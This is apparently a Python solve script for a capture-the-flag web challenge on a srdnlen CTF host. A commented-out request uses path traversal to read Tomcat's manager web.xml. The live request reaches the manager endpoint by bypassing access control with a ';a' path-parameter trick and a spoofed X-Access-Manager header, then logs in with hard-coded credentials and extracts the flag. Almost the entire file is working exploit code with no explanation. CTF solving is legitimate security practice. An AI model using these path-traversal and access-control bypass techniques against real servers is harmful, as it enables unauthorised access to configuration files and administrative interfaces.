import requests
from requests.auth import HTTPBasicAuth
import html
import re

url = "http://doubleshop.challs.srdnlen.it/"

# lfi
# res = requests.get(f'{url}/api/receipt.jsp', params={
#     'id': f'../../../../../usr/local/tomcat/webapps/manager/WEB-INF/web.xml'
# })

# print(html.unescape(res.text))

# manager endpoint
res = requests.get(f'{url}/api/manager;a/html', headers={
    'X-Access-Manager': '127.0.0.1',
}, auth=HTTPBasicAuth('adm1n', '317014774e3e85626bd2fa9c5046142c'))

flag = re.findall(r'(srdnlen{.+})', html.unescape(res.text))[0]
print("Flag:", flag)